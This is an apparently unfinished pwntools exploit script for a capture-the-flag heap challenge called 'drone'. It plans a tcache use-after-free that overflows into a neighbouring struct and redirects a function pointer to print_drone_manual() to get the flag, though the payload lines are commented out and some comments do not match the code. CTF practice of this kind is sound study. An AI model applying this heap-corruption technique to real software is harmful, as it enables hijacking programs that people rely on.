#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("drone")

gs = '''
b *start_drone_route+104
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)


"""
pwndbg> ptype struct Drone
type = struct Drone {
    int id;
    char *status;
    void (*start_route)(struct Drone *);
    void (*end_route)(struct Drone *);
}
"""





# Plan:
# When we make a drone and and retire it, the memory will be stored in the tcache and not consolidated
# with the top chunk. Our plan is to make 2 drones, delete the first one, then ask to make a drone route
# which will give us the memory that once was drone1 and then we can edit this to overflow into drone 2.
# then we will overflow the id parameter of drone 2 and call start_drone_route. The id parameter of drone 2
# has to be the addres of the function print_drone_manual() which will give us the flag.
# This is because start_drone_route will call the id as a function pointer


# Make drone 1
# Make drone 2

# Addresses
# kig videre i stat_drone_route TODO
print_drone_manual = 0x400836
status = 0x400da0

# Functions

def create_drone():
    io.sendline(b"1")
    io.recvuntil(b"Choose an option: ")

def delete_drone(drone_id):
    io.sendline(b"2")
    io.recv()
    io.sendline(drone_id)
    io.recvuntil(b"Choose an option: ")

def make_drone_route(data):
    io.sendline(b"4")
    io.recv()
    io.sendline(data)
    io.recvuntil(b"Choose an option: ")

def start_drone_route(drone_id):
    io.sendline(b"3")
    io.recvline(b"Enter drone ID to start its route: ")
    io.sendline(drone_id)
    io.recvuntil(b"Choose an option: ")



io = start()

# Setting ready for function calls
io.recv()



# Make 3 drones
create_drone()
create_drone()
create_drone()
create_drone()

# Delete the first and second drone, putting their memory into the tcache
delete_drone(b"4")
delete_drone(b"3")
delete_drone(b"2")
delete_drone(b"1")

create_drone()

# Create a drone route which will get the memory that belonged to the first drone
# write into the freed buffer just after the route
#create_drone()
#p = b"A" * 32 # fill the first 32 bytes of user memory with A's along with the first 8 bytes of metadata of drone 2
#p += p64(0)
#p += p64(0x30)
#p += p64(0x31) # keep the size field of drone2 equal to 0x31
#p += p64(0x2) # keep the drone id = 2
#p += p64(0x1) # overwrite status with 0x1
#p += p64(print_drone_manual) # overwrite the id of drone 2 with the address of print drone manual
#make_drone_route(p)

# Start drone route to call the print_drone_manual() and get the flag
#start_drone_route(b"3")




io.interactive()
